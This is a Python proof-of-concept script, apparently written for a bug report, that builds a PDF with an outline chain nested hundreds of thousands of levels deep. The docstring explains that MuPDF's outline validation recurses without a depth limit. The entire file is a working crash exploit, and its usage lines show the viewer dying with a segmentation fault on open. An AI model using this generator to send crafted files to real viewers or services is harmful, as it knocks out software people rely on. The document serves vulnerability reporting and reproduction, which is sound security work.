#!/usr/bin/env python3
# SPDX-License-Identifier: AGPL-3.0-or-later
"""Generate a PDF that stack-overflows MuPDF when its outline is loaded.

The outline is one chain nested N deep: each item's /First is the next item.
fz_load_outline -> pdf_new_outline_iterator -> pdf_test_outline validates the
tree by recursing once per /First level, with no depth limit, so a deep enough
nesting exhausts the stack. Every object is small and shallow -- the depth lives
in the references, not the syntax -- so the parser's nesting cap never applies.

    python3 mupdf_outline_depth_stackoverflow.py deep.pdf 200000
    gcc -O2 pure_mupdf_outline_repro.c -o repro /usr/lib64/libmupdf.so
    ./repro deep.pdf                                  # SIGSEGV

Unlike the reference-chain overflow, this one is on every viewer's path:
loading the outline is what a viewer does right after opening a document.
See README.md.
"""
import sys


def build(path, n):
    objs = [
        b"<< /Type /Catalog /Pages 2 0 R /Outlines 4 0 R >>",
        b"<< /Type /Pages /Kids [3 0 R] /Count 1 >>",
        b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] >>",
        b"<< /Type /Outlines /First 5 0 R /Last 5 0 R >>",
    ]
    for k in range(n):
        num = 5 + k
        kid = b" /First %d 0 R /Last %d 0 R" % (num + 1, num + 1) if k < n - 1 else b""
        objs.append(b"<< /Title (x) /Parent %d 0 R%s >>" % (num - 1, kid))

    out, offs = bytearray(b"%PDF-1.7\n"), []
    for i, o in enumerate(objs, 1):
        offs.append(len(out))
        out += b"%d 0 obj\n" % i + o + b"\nendobj\n"
    xref = len(out)
    out += b"xref\n0 %d\n0000000000 65535 f \n" % (len(objs) + 1)
    out += b"".join(b"%010d 00000 n \n" % o for o in offs)
    out += b"trailer\n<< /Size %d /Root 1 0 R >>\nstartxref\n%d\n%%%%EOF\n" % (
        len(objs) + 1, xref)
    with open(path, "wb") as f:
        f.write(out)
    print(f"{path}: outline nested {n} deep, {len(out) // 1024} KB")


if __name__ == "__main__":
    if len(sys.argv) != 3:
        sys.exit(f"usage: {sys.argv[0]} OUT.pdf DEPTH")
    build(sys.argv[1], int(sys.argv[2]))
